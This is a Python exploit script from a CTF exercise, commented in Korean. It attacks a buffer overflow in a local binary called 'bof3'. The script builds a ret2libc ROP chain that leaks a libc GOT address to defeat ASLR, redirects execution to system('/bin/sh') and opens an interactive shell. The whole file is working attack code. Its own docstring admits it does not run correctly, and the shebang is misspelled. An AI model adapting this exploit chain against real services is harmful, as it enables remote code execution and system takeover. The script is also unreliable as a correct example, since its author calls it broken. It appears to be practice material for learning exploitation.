#!/usr/bin/env pytohn
#-*- coding: utf-8 -*-
'''
	python ==> CTF, ASLR 방어 시스템을 우회하기 위해 주소누출 공격을 사용해본 예제 코드
                    정상적으로 작동하진 않는다
'''
import socket
import time
import os
import struct
import telnetlib

def connect(ip,port):
	return socket.create_connection((ip,port))

def p(x):
	return struct.pack('<I', x)

def u(x):
	return struct.unpack('<I', x)[0]

def interact(s):
	print('------- interactive mode ----------')
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()


# objdump -d -M intel -j .plt --no bof3 로 얻은 주소들
read_plt = 0x8048320
write_plt = 0x8048350
write_got = 0x804a018
__libc_start_main_plt = 0x8048340
__libc_start_main_got = 0x804a014
__libc_start_main_rel = 0x18540
system_rel = 0x3a940

# rp -f bof3 -r 3 --unique | grep pop 로 얻은 pop3ret 주소
pop3ret = 0x8048519


payload = b'A'*43
# write(1, __libc_start_main_got, 4)
payload += p(write_plt)
payload += p(pop3ret)
payload += p(1)
payload += p(__libc_start_main_got)
payload += p(4)

# read(0, __libc_start_main_got, 20)
payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(__libc_start_main_got)
payload += p(20)

# system('/bin/sh')
payload += p(__libc_start_main_plt)
payload += b'BBBB'
payload += p(__libc_start_main_got + 4)


s = connect('127.0.0.1', 4000)

print(s.recv(1024).decode('utf-8'))
s.send(payload)
time.sleep(0.1)

# 주소누출을 통해 libc_base 주소를 가져온다
__libc_start_main_addr = u(s.recv(1024))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel


print('libc_base:{}'.format(hex(libc_base)))
s.send(p(system_addr) + b'/bin/sh\0')
time.sleep(0.1)

interact(s)
